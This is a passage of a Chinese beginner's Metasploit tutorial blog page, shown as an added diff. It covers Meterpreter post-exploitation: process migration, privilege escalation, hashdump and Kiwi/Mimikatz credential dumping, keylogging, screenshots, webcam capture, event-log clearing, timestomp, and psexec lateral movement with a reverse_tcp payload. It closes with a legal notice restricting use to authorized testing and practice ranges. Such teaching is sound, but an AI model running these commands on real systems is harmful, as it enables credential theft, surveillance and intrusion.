ipconfig<br><br><span class="hljs-comment"># 查看路由表</span><br>meterpreter &gt; route<br><br><span class="hljs-comment"># 查看运行的进程</span><br>meterpreter &gt; ps<br><br><span class="hljs-comment"># 查看当前目录</span><br>meterpreter &gt; <span class="hljs-built_in">pwd</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="10-2-进程迁移"><a href="#10-2-进程迁移" class="headerlink" title="10.2 进程迁移"></a>10.2 进程迁移</h3><p>渗透进入的 Shell 通常绑定在某个不稳定的进程上（如 Web 服务器进程），一旦该进程被关闭，Shell 也会丢失。因此需要将 Shell 迁移到稳定的系统进程。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 列出所有进程，找到稳定进程的 PID（如 explorer.exe）</span><br>meterpreter &gt; ps<br><br><span class="hljs-comment"># 迁移到指定 PID</span><br>meterpreter &gt; migrate 1234<br><br><span class="hljs-comment"># 或使用 Post 模块自动迁移</span><br>meterpreter &gt; run post/windows/manage/migrate<br></code></pre></td></tr></table></figure>
+
+<h3 id="10-3-权限提升"><a href="#10-3-权限提升" class="headerlink" title="10.3 权限提升"></a>10.3 权限提升</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 尝试使用 getsystem 提权到 SYSTEM</span><br>meterpreter &gt; getsystem<br><br><span class="hljs-comment"># 查看本地提权建议</span><br>meterpreter &gt; run post/multi/recon/local_exploit_suggester<br><br><span class="hljs-comment"># 绕过 UAC（用户账户控制）</span><br>meterpreter &gt; run post/windows/gather/enum_patches    <span class="hljs-comment"># 先查看补丁情况</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="10-4-密码抓取"><a href="#10-4-密码抓取" class="headerlink" title="10.4 密码抓取"></a>10.4 密码抓取</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 抓取 Windows 密码哈希</span><br>meterpreter &gt; run post/windows/gather/hashdump<br><br><span class="hljs-comment"># 加载 Kiwi（Mimikatz）模块</span><br>meterpreter &gt; load kiwi<br><br><span class="hljs-comment"># 使用 Kiwi 获取明文密码</span><br>meterpreter &gt; creds_all<br><br><span class="hljs-comment"># 使用 Kiwi 获取 Kerberos 票据</span><br>meterpreter &gt; kiwi_cmd sekurlsa::tickets /export<br></code></pre></td></tr></table></figure>
+
+<h3 id="10-5-键盘记录"><a href="#10-5-键盘记录" class="headerlink" title="10.5 键盘记录"></a>10.5 键盘记录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 开始键盘记录</span><br>meterpreter &gt; keyscan_start<br><br><span class="hljs-comment"># 等待一段时间后查看记录</span><br>meterpreter &gt; keyscan_dump<br><br><span class="hljs-comment"># 停止键盘记录</span><br>meterpreter &gt; keyscan_stop<br></code></pre></td></tr></table></figure>
+
+<h3 id="10-6-屏幕截图"><a href="#10-6-屏幕截图" class="headerlink" title="10.6 屏幕截图"></a>10.6 屏幕截图</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 截图</span><br>meterpreter &gt; screenshot<br><br><span class="hljs-comment"># 实时查看桌面（需要 VNC）</span><br>meterpreter &gt; run vnc<br></code></pre></td></tr></table></figure>
+
+<h3 id="10-7-文件系统操作"><a href="#10-7-文件系统操作" class="headerlink" title="10.7 文件系统操作"></a>10.7 文件系统操作</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看当前目录</span><br>meterpreter &gt; <span class="hljs-built_in">pwd</span><br><br><span class="hljs-comment"># 列出文件</span><br>meterpreter &gt; <span class="hljs-built_in">ls</span><br><br><span class="hljs-comment"># 搜索文件</span><br>meterpreter &gt; search -f *.txt -d c:\\<span class="hljs-built_in">users</span>\\<br><br><span class="hljs-comment"># 上传文件到目标</span><br>meterpreter &gt; upload /path/to/local/file C:\\target\\path\\<br><br><span class="hljs-comment"># 下载文件到本地</span><br>meterpreter &gt; download C:\\target\\secret.txt /path/to/local/<br><br><span class="hljs-comment"># 删除文件</span><br>meterpreter &gt; <span class="hljs-built_in">rm</span> C:\\target\\file.txt<br><br><span class="hljs-comment"># 切换目录</span><br>meterpreter &gt; <span class="hljs-built_in">cd</span> C:\\Windows\\System32\\<br></code></pre></td></tr></table></figure>
+
+<h3 id="10-8-执行系统命令"><a href="#10-8-执行系统命令" class="headerlink" title="10.8 执行系统命令"></a>10.8 执行系统命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 在目标上执行命令</span><br>meterpreter &gt; execute -f cmd.exe -i -H<br><br><span class="hljs-comment"># 进入系统 Shell</span><br>meterpreter &gt; shell<br></code></pre></td></tr></table></figure>
+
+<h3 id="10-9-会话管理"><a href="#10-9-会话管理" class="headerlink" title="10.9 会话管理"></a>10.9 会话管理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 将当前会话放到后台</span><br>meterpreter &gt; background<br><br><span class="hljs-comment"># 查看所有会话</span><br>msf6 &gt; sessions -l<br><br><span class="hljs-comment"># 进入指定会话</span><br>msf6 &gt; sessions -i 1<br><br><span class="hljs-comment"># 关闭指定会话</span><br>msf6 &gt; sessions -k 1<br><br><span class="hljs-comment"># 在会话中执行命令（不进入会话）</span><br>msf6 &gt; sessions -c <span class="hljs-string">&quot;sysinfo&quot;</span> -i 1<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="11-Meterpreter-常用命令速查"><a href="#11-Meterpreter-常用命令速查" class="headerlink" title="11. Meterpreter 常用命令速查"></a>11. Meterpreter 常用命令速查</h2><p>Meterpreter 是 MSF 中最强大的 Payload 之一，它运行在内存中，不落地磁盘，难以被检测。</p>
+<h3 id="11-1-系统命令"><a href="#11-1-系统命令" class="headerlink" title="11.1 系统命令"></a>11.1 系统命令</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>sysinfo</code></td>
+<td>查看系统信息（OS、主机名、架构等）</td>
+</tr>
+<tr>
+<td><code>getuid</code></td>
+<td>查看当前用户</td>
+</tr>
+<tr>
+<td><code>getpid</code></td>
+<td>查看当前进程 PID</td>
+</tr>
+<tr>
+<td><code>getprivs</code></td>
+<td>查看当前权限</td>
+</tr>
+<tr>
+<td><code>ps</code></td>
+<td>列出进程</td>
+</tr>
+<tr>
+<td><code>kill</code></td>
+<td>结束进程</td>
+</tr>
+<tr>
+<td><code>migrate</code></td>
+<td>迁移到其他进程</td>
+</tr>
+<tr>
+<td><code>getsystem</code></td>
+<td>尝试提升到 SYSTEM 权限</td>
+</tr>
+<tr>
+<td><code>shell</code></td>
+<td>进入系统命令行</td>
+</tr>
+<tr>
+<td><code>execute</code></td>
+<td>执行命令</td>
+</tr>
+<tr>
+<td><code>reboot</code></td>
+<td>重启目标</td>
+</tr>
+<tr>
+<td><code>shutdown</code></td>
+<td>关闭目标</td>
+</tr>
+</tbody></table>
+<h3 id="11-2-网络命令"><a href="#11-2-网络命令" class="headerlink" title="11.2 网络命令"></a>11.2 网络命令</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ipconfig</code></td>
+<td>查看网络配置</td>
+</tr>
+<tr>
+<td><code>route</code></td>
+<td>查看&#x2F;修改路由表</td>
+</tr>
+<tr>
+<td><code>portfwd</code></td>
+<td>端口转发</td>
+</tr>
+<tr>
+<td><code>arp</code></td>
+<td>查看 ARP 表</td>
+</tr>
+<tr>
+<td><code>netstat</code></td>
+<td>查看网络连接</td>
+</tr>
+</tbody></table>
+<h3 id="11-3-文件系统命令"><a href="#11-3-文件系统命令" class="headerlink" title="11.3 文件系统命令"></a>11.3 文件系统命令</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ls</code></td>
+<td>列出文件</td>
+</tr>
+<tr>
+<td><code>cd</code></td>
+<td>切换目录</td>
+</tr>
+<tr>
+<td><code>pwd</code></td>
+<td>当前目录</td>
+</tr>
+<tr>
+<td><code>cat</code></td>
+<td>查看文件内容</td>
+</tr>
+<tr>
+<td><code>download</code></td>
+<td>下载文件</td>
+</tr>
+<tr>
+<td><code>upload</code></td>
+<td>上传文件</td>
+</tr>
+<tr>
+<td><code>rm</code></td>
+<td>删除文件</td>
+</tr>
+<tr>
+<td><code>mkdir</code></td>
+<td>创建目录</td>
+</tr>
+<tr>
+<td><code>rmdir</code></td>
+<td>删除目录</td>
+</tr>
+<tr>
+<td><code>search</code></td>
+<td>搜索文件</td>
+</tr>
+<tr>
+<td><code>edit</code></td>
+<td>编辑文件</td>
+</tr>
+</tbody></table>
+<h3 id="11-4-信息收集命令"><a href="#11-4-信息收集命令" class="headerlink" title="11.4 信息收集命令"></a>11.4 信息收集命令</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>hashdump</code></td>
+<td>抓取密码哈希</td>
+</tr>
+<tr>
+<td><code>keyscan_start</code></td>
+<td>开始键盘记录</td>
+</tr>
+<tr>
+<td><code>keyscan_dump</code></td>
+<td>查看键盘记录</td>
+</tr>
+<tr>
+<td><code>keyscan_stop</code></td>
+<td>停止键盘记录</td>
+</tr>
+<tr>
+<td><code>screenshot</code></td>
+<td>屏幕截图</td>
+</tr>
+<tr>
+<td><code>webcam_list</code></td>
+<td>列出摄像头</td>
+</tr>
+<tr>
+<td><code>webcam_snap</code></td>
+<td>摄像头拍照</td>
+</tr>
+<tr>
+<td><code>idletime</code></td>
+<td>查看用户空闲时间</td>
+</tr>
+</tbody></table>
+<h3 id="11-5-其他命令"><a href="#11-5-其他命令" class="headerlink" title="11.5 其他命令"></a>11.5 其他命令</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>background</code></td>
+<td>后台运行当前会话</td>
+</tr>
+<tr>
+<td><code>clearev</code></td>
+<td>清除 Windows 事件日志</td>
+</tr>
+<tr>
+<td><code>timestomp</code></td>
+<td>修改文件时间戳</td>
+</tr>
+<tr>
+<td><code>run</code></td>
+<td>运行 Post 模块</td>
+</tr>
+<tr>
+<td><code>load</code></td>
+<td>加载扩展（如 kiwi）</td>
+</tr>
+<tr>
+<td><code>help</code></td>
+<td>查看 Meterpreter 帮助</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="12-内网渗透基础"><a href="#12-内网渗透基础" class="headerlink" title="12. 内网渗透基础"></a>12. 内网渗透基础</h2><p>当获取了边界服务器的控制权后，可以将其作为跳板，对内网其他主机进行渗透。</p>
+<h3 id="12-1-添加路由"><a href="#12-1-添加路由" class="headerlink" title="12.1 添加路由"></a>12.1 添加路由</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看当前 Meterpreter 会话的路由</span><br>meterpreter &gt; route<br><br><span class="hljs-comment"># 通过当前会话添加到达内网的路由</span><br>msf6 &gt; route add 10.0.0.0 255.255.255.0 1<br></code></pre></td></tr></table></figure>
+
+<p>其中 <code>1</code> 是会话 ID。</p>
+<h3 id="12-2-扫描内网"><a href="#12-2-扫描内网" class="headerlink" title="12.2 扫描内网"></a>12.2 扫描内网</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用 MSF 的 TCP 扫描模块</span><br>msf6 &gt; use auxiliary/scanner/portscan/tcp<br>msf6 auxiliary(scanner/portscan/tcp) &gt; <span class="hljs-built_in">set</span> RHOSTS 10.0.0.0/24<br>msf6 auxiliary(scanner/portscan/tcp) &gt; <span class="hljs-built_in">set</span> PORTS 445,3389,22,80<br>msf6 auxiliary(scanner/portscan/tcp) &gt; run<br></code></pre></td></tr></table></figure>
+
+<h3 id="12-3-横向移动"><a href="#12-3-横向移动" class="headerlink" title="12.3 横向移动"></a>12.3 横向移动</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用 psexec（需要内网主机的管理员凭据）</span><br>msf6 &gt; use exploit/windows/smb/psexec<br>msf6 exploit(windows/smb/psexec) &gt; <span class="hljs-built_in">set</span> RHOSTS 10.0.0.50<br>msf6 exploit(windows/smb/psexec) &gt; <span class="hljs-built_in">set</span> SMBUser administrator<br>msf6 exploit(windows/smb/psexec) &gt; <span class="hljs-built_in">set</span> SMBPass aad3b435b51404eeaad3b435b51404ee:xxxxx<br>msf6 exploit(windows/smb/psexec) &gt; <span class="hljs-built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp<br>msf6 exploit(windows/smb/psexec) &gt; <span class="hljs-built_in">set</span> LHOST 192.168.1.7<br>msf6 exploit(windows/smb/psexec) &gt; run<br></code></pre></td></tr></table></figure>
+
+<h3 id="12-4-枚举内网信息"><a href="#12-4-枚举内网信息" class="headerlink" title="12.4 枚举内网信息"></a>12.4 枚举内网信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 枚举登录用户</span><br>meterpreter &gt; run post/windows/gather/enum_logged_on_users<br><br><span class="hljs-comment"># 枚举域信息</span><br>meterpreter &gt; run post/windows/gather/enum_domain<br><br><span class="hljs-comment"># 枚举共享资源</span><br>meterpreter &gt; run post/windows/gather/enum_shares<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="13-常见问题排查"><a href="#13-常见问题排查" class="headerlink" title="13. 常见问题排查"></a>13. 常见问题排查</h2><h3 id="13-1-MSF-无法启动"><a href="#13-1-MSF-无法启动" class="headerlink" title="13.1 MSF 无法启动"></a>13.1 MSF 无法启动</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 检查 PostgreSQL 是否运行</span><br><span class="hljs-built_in">sudo</span> service postgresql status<br><br><span class="hljs-comment"># 如果未运行，启动它</span><br><span class="hljs-built_in">sudo</span> service postgresql start<br><br><span class="hljs-comment"># 初始化 MSF 数据库</span><br><span class="hljs-built_in">sudo</span> msfdb init<br><br><span class="hljs-comment"># 重新启动 MSF</span><br>msfconsole<br></code></pre></td></tr></table></figure>
+
+<h3 id="13-2-数据库连接失败"><a href="#13-2-数据库连接失败" class="headerlink" title="13.2 数据库连接失败"></a>13.2 数据库连接失败</h3><p>在 MSF 中检查数据库状态：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 &gt; db_status<br></code></pre></td></tr></table></figure>
+
+<p>如果显示未连接，手动连接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 &gt; db_connect<br></code></pre></td></tr></table></figure>
+
+<h3 id="13-3-Payload-无法上线"><a href="#13-3-Payload-无法上线" class="headerlink" title="13.3 Payload 无法上线"></a>13.3 Payload 无法上线</h3><p><strong>可能原因及解决方法：</strong></p>
+<ol>
+<li><strong>网络不通</strong>：确认攻击机和目标机可以相互通信（<code>ping</code> 测试）</li>
+<li><strong>防火墙拦截</strong>：临时关闭目标防火墙或更换端口（如使用 443 端口伪装 HTTPS 流量）</li>
+<li><strong>Payload 架构不匹配</strong>：确认目标系统是 32 位还是 64 位，选择对应的 Payload</li>
+<li><strong>LHOST 设置错误</strong>：确认 LHOST 是攻击机的 IP 地址，且目标能够访问到</li>
+</ol>
+<h3 id="13-4-模块执行失败"><a href="#13-4-模块执行失败" class="headerlink" title="13.4 模块执行失败"></a>13.4 模块执行失败</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 更新 MSF 到最新版本</span><br><span class="hljs-built_in">sudo</span> apt update &amp;&amp; <span class="hljs-built_in">sudo</span> apt install metasploit-framework<br><br><span class="hljs-comment"># 检查模块是否已加载</span><br>msf6 &gt; reload_all<br></code></pre></td></tr></table></figure>
+
+<h3 id="13-5-会话意外断开"><a href="#13-5-会话意外断开" class="headerlink" title="13.5 会话意外断开"></a>13.5 会话意外断开</h3><ul>
+<li>检查目标是否关机或重启</li>
+<li>检查是否有杀毒软件终止了 Payload</li>
+<li>尝试使用进程迁移将 Shell 绑定到稳定的系统进程</li>
+<li>考虑使用持久化机制（如 <code>run persistence</code>）</li>
+</ul>
+<hr>
+<h2 id="14-学习资源与练习靶场"><a href="#14-学习资源与练习靶场" class="headerlink" title="14. 学习资源与练习靶场"></a>14. 学习资源与练习靶场</h2><h3 id="14-1-官方文档"><a href="#14-1-官方文档" class="headerlink" title="14.1 官方文档"></a>14.1 官方文档</h3><ul>
+<li>Metasploit 官方文档：<a target="_blank" rel="noopener" href="https://docs.metasploit.com/">https://docs.metasploit.com/</a></li>
+<li>Rapid7 官方博客：<a target="_blank" rel="noopener" href="https://www.rapid7.com/blog/">https://www.rapid7.com/blog/</a></li>
+<li>Metasploit GitHub 仓库：<a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework">https://github.com/rapid7/metasploit-framework</a></li>
+</ul>
+<h3 id="14-2-在线靶场"><a href="#14-2-在线靶场" class="headerlink" title="14.2 在线靶场"></a>14.2 在线靶场</h3><table>
+<thead>
+<tr>
+<th>平台</th>
+<th>说明</th>
+<th>网址</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Hack The Box</strong></td>
+<td>综合渗透测试平台，适合进阶</td>
+<td><a target="_blank" rel="noopener" href="https://www.hackthebox.com/">https://www.hackthebox.com</a></td>
+</tr>
+<tr>
+<td><strong>TryHackMe</strong></td>
+<td>新手友好，有完整的 Metasploit 学习路径</td>
+<td><a target="_blank" rel="noopener" href="https://tryhackme.com/">https://tryhackme.com</a></td>
+</tr>
+<tr>
+<td><strong>VulnHub</strong></td>
+<td>提供可下载的漏洞靶机</td>
+<td><a target="_blank" rel="noopener" href="https://www.vulnhub.com/">https://www.vulnhub.com</a></td>
+</tr>
+<tr>
+<td><strong>PentesterLab</strong></td>
+<td>Web 渗透测试练习</td>
+<td><a target="_blank" rel="noopener" href="https://pentesterlab.com/">https://pentesterlab.com</a></td>
+</tr>
+</tbody></table>
+<h3 id="14-3-推荐书籍"><a href="#14-3-推荐书籍" class="headerlink" title="14.3 推荐书籍"></a>14.3 推荐书籍</h3><ul>
+<li>《Metasploit 渗透测试指南》（Metasploit: The Penetration Tester’s Guide）</li>
+<li>《Metasploit 渗透测试魔鬼训练营》</li>
+<li>《Kali Linux 渗透测试技术详解》</li>
+</ul>
+<h3 id="14-4-漏洞数据库"><a href="#14-4-漏洞数据库" class="headerlink" title="14.4 漏洞数据库"></a>14.4 漏洞数据库</h3><ul>
+<li><strong>Exploit-DB</strong>：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></li>
+<li><strong>CVE Details</strong>：<a target="_blank" rel="noopener" href="https://www.cvedetails.com/">https://www.cvedetails.com/</a></li>
+<li><strong>NVD（美国国家漏洞数据库）</strong>：<a target="_blank" rel="noopener" href="https://nvd.nist.gov/">https://nvd.nist.gov/</a></li>
+</ul>
+<hr>
+<h2 id="15-法律与道德声明"><a href="#15-法律与道德声明" class="headerlink" title="15. 法律与道德声明"></a>15. 法律与道德声明</h2><p><strong>本教程仅用于合法的安全研究和授权的渗透测试。</strong></p>
+<p>在使用 Metasploit Framework 之前，请务必遵守以下原则：</p>
+<ol>
+<li><strong>仅在授权范围内使用</strong>：永远不要对未获得明确书面授权的系统进行渗透测试。</li>
+<li><strong>遵守法律法规</strong>：未经授权的计算机入侵行为违反《中华人民共和国刑法》第 285 条、第 286 条以及《中华人民共和国网络安全法》等相关法律法规。</li>
+<li><strong>在隔离环境中练习</strong>：初学者应在虚拟机或专用靶场（如 VulnHub、Hack The Box）中练习，切勿对互联网上的真实系统进行攻击。</li>
+<li><strong>负责任地披露漏洞</strong>：如果发现漏洞，请通过合法渠道向相关方报告。</li>
+</ol>
+<blockquote>
+<p>技术是工具，使用者的意图决定了它的性质。做一名有道德的安全从业者，用技术保护而非破坏。</p>
+</blockquote>
+<hr>
+<p><em>文档版本：v1.0 | 更新日期：2026年7月</em></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="category-chain-item">渗透测试</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Metasploit/" class="print-no-link">#Metasploit</a>
+      
+        <a href="/tags/MSF/" class="print-no-link">#MSF</a>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="print-no-link">#渗透测试</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Metasploit Framework (MSF) 零基础入门教程</div>
+      <div>https://chiya-66.github.io/2026/07/21/MSF零基础入门教程/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>chiya-66</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年7月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/07/29/AI%E6%8F%90%E7%A4%BA%E8%AF%8D%E4%B8%8ERAG%E6%8A%80%E6%9C%AF/" title="AI提示词与RAG技术">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">AI提示词与RAG技术</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/07/18/rce/" title="命令注入相关的特殊字符">
+                        <span class="hidden-mobile">命令注入相关的特殊字符</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
